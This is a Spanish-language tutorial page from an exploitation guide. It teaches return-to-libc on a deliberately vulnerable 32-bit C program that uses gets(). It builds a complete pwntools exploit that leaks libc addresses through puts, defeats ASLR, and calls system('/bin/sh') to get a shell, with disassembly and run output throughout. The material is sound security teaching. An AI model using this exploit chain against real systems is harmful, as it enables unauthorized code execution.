---
layout: default
title: Return To Libc
grand_parent: Tipos de explotación
parent: Explotación orientada a control
nav_order: 2
---

# Return To Libc
{: .no_toc }

## Conocimientos necesarios
{: .no_toc .text-delta }

Antes de comenzar con esta sección, es recomendable que leas las siguientes
secciones de la guía si aún no las has leído:

[Stack](../../conceptos/stack.html){: .btn .btn-green }
[Calling Conventions](../../conceptos/calling_conventions.html){: .btn .btn-green }
[Procedure Linkage Table](../../conceptos/plt.html){: .btn .btn-green }
[Global Offset Table](../../conceptos/got.html){: .btn .btn-green }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Información General

En secciones anteriores de la guía hemos visto que podemos alterar el flujo
de ejecución de un programa de distintas formas.
En [Format String Bug](../../tipos_errores/espacial/format_string.html){: .label .label-green }
modificamos la global offset table para lograr ejecutar una función win. En
[Code Injection](../../tipos_explotacion/control/code_injection.html){: .label .label-green }
utilizamos un buffer overflow para ejecutar un shellcode de nuestra elección.
Pero, ¿qué pasa cuando no existe una función win en el binario?, o ¿qué podemos
hacer cuando no podemos ejecutar un shellcode?.

Esta técnica consiste en lograr que el programa ejecute funciones de la
librería de C de nuestra elección.

---

## Ejemplo

```c
#include <stdio.h>

void vuln() {
  puts("Ingresa input:");
  char buf[16];
  gets(buf);
}

int main() {
  vuln();
}
```

Para facilitar el ejemplo, lo compilaremos sin 
[Canary](../../mecanismos_seguridad/canary.html){: .label .label-green }, sin
[PIE](../../mecanismos_seguridad/pie.html){: .label .label-green }
y para 32 bits. También habilitaremos
[NX](../../mecanismos_seguridad/nx.html){: .label .label-green }
para que no sea posible ejecutar un shellcode en el stack.

Comencemos a analizar el código, podemos identificar un buffer overflow en
la función vuln, pero, ¿qué podemos lograr con eso?. En este código no
tenemos ninguna función win que queramos ejecutar utilizando el overflow.
Además, las únicas funciones de libc que utiliza el programa son puts
y gets, lo cual no sirve de mucho por sí solo.

Lo que buscamos siempre es obtener ejecución de comandos. Una función
que nos permite alcanzar esto es la función `system` de libc. Nuestro
programa no utiliza esta función, por lo que no está en la global offset
table, lo que significa que tendremos que encontrar la dirección de system
manualmente. Para encontrar la dirección de una función cualquiera de libc
en un sistema con ASLR, necesitamos 2 cosas:

1. Un leak de cualquier función de libc.
1. La versión de libc de la máquina que ejecuta el binario (en este
caso lo ejecutaremos localmente, por lo que ya sabemos la versión de libc
que se utiliza).

Lo primero que haremos será obtener un leak de la función puts. Obtengamos
la dirección de puts@plt con objdump.

```
$ objdump -d ret2libc_example -M intel

...

08049050 <puts@plt>:
 8049050:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
 8049056:       68 10 00 00 00          push   0x10
 804905b:       e9 c0 ff ff ff          jmp    8049020 <_init+0x20>

...

```

Observamos que la dirección de puts es 0x08049050 y que hace un jmp a
*0x804c008, por lo que sabemos que 0x804c008 es la dirección de puts en
got.

Veamos el ensamblador de la función vuln para empezar a bosquejar el stack.


```
$ objdump -d ret2libc_example -M intel

...

08049166 <vuln>:
 8049166:       55                      push   ebp
 8049167:       89 e5                   mov    ebp,esp
 8049169:       53                      push   ebx
 804916a:       83 ec 14                sub    esp,0x14
 804916d:       e8 2e ff ff ff          call   80490a0 <__x86.get_pc_thunk.bx>
 8049172:       81 c3 82 2e 00 00       add    ebx,0x2e82
 8049178:       83 ec 0c                sub    esp,0xc
 804917b:       8d 83 14 e0 ff ff       lea    eax,[ebx-0x1fec]
 8049181:       50                      push   eax
 8049182:       e8 c9 fe ff ff          call   8049050 <puts@plt>
 8049187:       83 c4 10                add    esp,0x10
 804918a:       83 ec 0c                sub    esp,0xc
 804918d:       8d 45 e8                lea    eax,[ebp-0x18]
 8049190:       50                      push   eax
 8049191:       e8 aa fe ff ff          call   8049040 <gets@plt>
 8049196:       83 c4 10                add    esp,0x10
 8049199:       90                      nop
 804919a:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 804919d:       c9                      leave
 804919e:       c3                      ret

...

```

Vemos que el argumento que le pasa a la función gets es ebp-0x18, por lo
que sabemos que en ebp-0x18 inicia nuestro input.

| Direcciones relativas  | Nombres                 | Stack       | Registros   |
|:-----------------------|:------------------------|:------------|:------------|
| ebp-0x18               | buf                     | ?           |             |
| ebp-0x14               | buf                     | ?           |             |
| ebp-0x10               | buf                     | ?           |             |
| ebp-0xc                | buf                     | ?           |             |
| ebp-0x8                |                         | ?           |             |
| ebp-0x4                |                         | ?           |             |
| ebp                    | ebp guardado            | ?           | <- ebp      |
| ebp+0x4                | return address          | 0x080491b4  |             |

Con esta información, sabemos que necesitamos 0x18 + 0x4 bytes de offset para
alcancar nuestro return address.

Comencemos haciendo un script con python y pwntools para cambiar el return
address por la dirección de puts@plt.

```py
from pwn import *

context.binary = vuln = ELF("./ret2libc_example")
context.log_level = 'critical'

p = process(vuln.path)

offset = 0x18 + 0x4

payload = b"A" * offset
payload += p32(vuln.plt["puts"])

p.sendlineafter(b"Ingresa input:", payload)
p.interactive()
```

Obtenemos la siguiente salida:

```
$ python3 ret2libc.py
[*] '/tmp/ret2libc_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

/tmp/ret2libc_example
```

Vemos que la función puts imprime "/tmp/ret2libc_example". Basado en esto,
podemos deducir que el stack tiene la siguiente estructura después
del overflow.

| Direcciones relativas  | Nombres                    | Stack       | Registros   |
|:-----------------------|:---------------------------|:------------|:------------|
| ebp-0x18               | buf                        | 0x41414141  |             |
| ebp-0x14               | buf                        | 0x41414141  |             |
| ebp-0x10               | buf                        | 0x41414141  |             |
| ebp-0xc                | buf                        | 0x41414141  |             |
| ebp-0x8                |                            | 0x41414141  |             |
| ebp-0x4                |                            | 0x41414141  |             |
| ebp                    | ebp guardado               | 0x41414141  | <- ebp      |
| ebp+0x4                | return address (puts@plt)  | 0x08049050  |             |
| ebp+0x8                |                            | ?           |             |
| ebp+0xc                | addr /tmp/ret2libc_example | ?           |             |

Observando que en ebp+0xc tenemos la dirección del string que está imprimiendo
puts, significa que puts está tomando este address como su primer argumento.
Esto significa que el stack frame al momento de ejecutar la función puts
es parecido a:

| Direcciones relativas  | Nombres                           | Stack       | Registros   |
|:-----------------------|:----------------------------------|:------------|:------------|
|  ebp-0x1c              |                                   | 0x41414141  |             |
|  ebp-0x18              |                                   | 0x41414141  |             |
|  ebp-0x14              |                                   | 0x41414141  |             |
|  ebp-0x10              |                                   | 0x41414141  |             |
|  ebp-0xc               |                                   | 0x41414141  |             |
|  ebp-0x8               |                                   | 0x41414141  |             |
|  ebp-0x4               |                                   | 0x41414141  |             |
|  ebp                   | ebp guardado                      | ?           | <- ebp      |
|  ebp+0x4               | return address                    | ?           |             |
|  ebp+0x8               | addr /tmp/ret2libc_example (arg1) | ?           |             |

Vemos que después del return address de la función vuln, el siguiente valor
en el stack es el return address a donde debe regresar puts al terminar
de ejecutarse y el siguiente valor en el stack es el primer argumento que
utilizará la función puts.

Con esto en mente, nuestro objetivo será:

1. Cambiar el return address de vuln para saltar a puts como ya logramos.
1. Extender el overflow para que al finalizar puts, regrese a la función main.
1. Extender el overflow para que el primer argumento de puts sea el got de
puts (de esta forma lograremos que puts imprima la dirección de puts).

El script modificado resulta de la siguiente forma:

```py
from pwn import *

context.binary = vuln = ELF("./ret2libc_example")
context.log_level = 'critical'

p = process(vuln.path)

offset = 0x18 + 0x4

payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["puts"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de puts

p.sendlineafter(b"Ingresa input:", payload)
p.interactive()
```

Veamos la salida que obtenemos al ejecutar el script:

```
$ python3 ret2libc.py
[*] '/tmp/ret2libc_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

 \x82\xc7\xf7
Ingresa input:
```

Podemos notar 2 cosas importantes:

1. El programa imprimió caracteres extraños, estos caracteres son la
dirección de puts.
2. El programa nos pide ingresar input nuevamente, lo que significa que
logramos regresar a main exitosamente.

Modifiquemos nuestro script para guardar el address que nos imprimió puts
en una variable.

```py
from pwn import *

context.binary = vuln = ELF("./ret2libc_example")
context.log_level = 'critical'

p = process(vuln.path)

offset = 0x18 + 0x4

payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["puts"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de puts

p.sendlineafter(b"Ingresa input:", payload)
p.recvline() # Leer salto de linea

puts_leak = p.recv(4)
puts_leak = u32(puts_leak)

log.critical(f"Address de puts: {hex(puts_leak)}")

p.interactive()
```

Salida:

```
$ python3 ret2libc.py
[*] '/tmp/ret2libc_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[CRITICAL] Address de puts: 0xf7c78220

Ingresa input:
```

El siguiente paso será identificar la versión de libc que utiliza el
binario. Para esto conseguiremos un leak más.

```py
from pwn import *

context.binary = vuln = ELF("./ret2libc_example")
context.log_level = 'critical'

p = process(vuln.path)

## Primer main

offset = 0x18 + 0x4

payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["puts"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de puts

p.sendlineafter(b"Ingresa input:", payload)
p.recvline() # Leer salto de linea

puts_leak = p.recv(4)
puts_leak = u32(puts_leak)

## Segundo main


payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["gets"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de gets

p.sendlineafter(b"Ingresa input:", payload)
p.recvline() # Leer salto de linea

gets_leak = p.recv(4)
gets_leak = u32(gets_leak)

## Tercer main

log.critical(f"Address de puts: {hex(puts_leak)}")
log.critical(f"Address de gets: {hex(gets_leak)}")

p.interactive()
```

Salida:

```
$ python3 ret2libc.py
[*] '/tmp/ret2libc_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[CRITICAL] Address de puts: 0xf7c78220
[CRITICAL] Address de gets: 0xf7c77860
 \x82\xc7\xf7
Ingresa input:
```

Vemos que el address de gets es 0xf7c77860 y el de puts es 0xf7c78220. Podemos
identificar la versión de libc utilizando los últimos 3 digitos de estas
direcciones, ya que estos 3 digitos no son afectados por el offset aleatorio
que agrega ASLR.

En una página como [https://libc.blukat.me/](https://libc.blukat.me/)
podemos realizar la búsqueda.

En caso de no encontrar la versión en alguna página, también existe
este repositorio: [https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database).

En mi caso mi versión de libc es poco convencional, por lo que no está
en la base de datos, pero un ejemplo de cómo encontrar una versión utilizando
el repositorio mencionado anteriormente es el siguiente:

```
$ ./find puts 220 gets 860
/usr/lib32/libc.so.6 (local-8156c6d66ea6d6b12d888f880017496b339c6bea)
```

Una vez que tenemos el libc correcto, ya solo falta agregarlo a nuestro
script y obtener la dirección de system.

```py
from pwn import *

context.binary = vuln = ELF("./ret2libc_example")
context.log_level = 'critical'
libc = ELF("./libc.so.6") # El archivo de libc que encontramos gracias a los leaks.

p = process(vuln.path)

## Primer main

offset = 0x18 + 0x4

payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["puts"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de puts

p.sendlineafter(b"Ingresa input:", payload)
p.recvline() # Leer salto de linea

puts_leak = p.recv(4)
puts_leak = u32(puts_leak)

## Segundo main


payload = b"A" * offset
payload += p32(vuln.plt["puts"]) # 1 Cambiar el return address de vuln para saltar a puts como ya logramos.
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar puts, regrese a la función main.
payload += p32(vuln.got["gets"]) # 3 Extender el overflow para que el primer argumento de puts sea el got de gets

p.sendlineafter(b"Ingresa input:", payload)
p.recvline() # Leer salto de linea

gets_leak = p.recv(4)
gets_leak = u32(gets_leak)

## Tercer main

log.critical(f"Address de puts: {hex(puts_leak)}")
log.critical(f"Address de gets: {hex(gets_leak)}")

libc.address = (puts_leak - libc.symbols["puts"]) # Con esto hacemos bypass a ASLR, ya que obtenemos la dirección base de nuestro libc

# Ahora que tenemos el libc correcto y el address correcto de libc, obtenemos la direccion de system
system_addr = libc.symbols["system"]

# Tambien necesitamos ejecutar el comando /bin/sh, por lo que tambien obtenemos la direccion de ese string en libc
bin_sh_addr = next(libc.search(b"/bin/sh"))

payload = b"A" * offset
payload += p32(system_addr) # 1 Cambiar el return address de vuln para saltar a system
payload += p32(vuln.symbols["main"]) # 2 Extender el overflow para que al finalizar system, regrese a la función main.
payload += p32(bin_sh_addr) # 3 Extender el overflow para que el primer argumento de system sea /bin/sh

p.sendlineafter(b"Ingresa input:", payload)

p.interactive()
```

Y ejecutamos el script para obtener ejecución de comandos:

```
$ python3 ret2libc.py
[*] '/tmp/ret2libc_example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[CRITICAL] Address de puts: 0xf7c78220
[CRITICAL] Address de gets: 0xf7c77860

$ echo "ejecucion de comandos"
ejecucion de comandos
$ cal
   September 2023
Su Mo Tu We Th Fr Sa
                1  2
 3  4  5  6  7  8  9
10 11 12 13 14 15 16
17 18 19 20 21 22 23
24 25 26 27 28 29 30

$ exit
Ingresa input:
```
